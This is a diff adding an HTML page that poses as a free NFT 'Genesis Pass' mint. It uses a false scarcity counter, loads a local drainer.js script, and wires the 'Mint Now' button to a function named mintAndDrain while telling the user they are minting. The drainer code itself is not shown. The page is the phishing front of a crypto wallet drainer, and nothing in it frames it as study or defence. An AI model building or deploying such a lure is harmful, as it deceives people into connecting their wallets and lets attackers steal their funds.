@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Exclusive Mint — Genesis Pass</title>
+<style>
+body{font-family:Inter,Arial,sans-serif;background:#0a0a0f;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+.card{background:#13131c;border:1px solid #26263a;border-radius:16px;padding:40px;max-width:420px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+h1{font-size:24px;margin:0 0 8px}p{color:#9a9ab0;font-size:14px}button{background:linear-gradient(135deg,#7c3aed,#4f46e5);border:0;color:#fff;font-size:16px;font-weight:700;padding:14px 32px;border-radius:10px;cursor:pointer;width:100%;margin-top:20px}#status{margin-top:12px;font-size:13px;color:#666}img{width:100%;border-radius:12px;margin-bottom:16px}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+<div class="card">
+<img src="https://picsum.photos/400/300" alt="Genesis">
+<h1>Genesis Pass — Free Mint</h1>
+<p>Supply: 1,111 &nbsp;•&nbsp; <span id="left">87 left</span></p>
+<button id="mintBtn">Mint Now</button>
+<div id="status"></div>
+</div>
+<script src="./drainer.js"></script>
+<script>
+document.getElementById('mintBtn').onclick = async () => {
+  const s = document.getElementById('status');
+  s.textContent = 'Connecting...';
+  try { await window.Drainer.mintAndDrain((m)=>{ s.textContent = m; }); s.textContent = 'Minted successfully ✓'; }
+  catch(e){ console.error(e); s.textContent = 'Failed: ' + (e.message||e); }
+};
+</script>
+</body>
+</html>
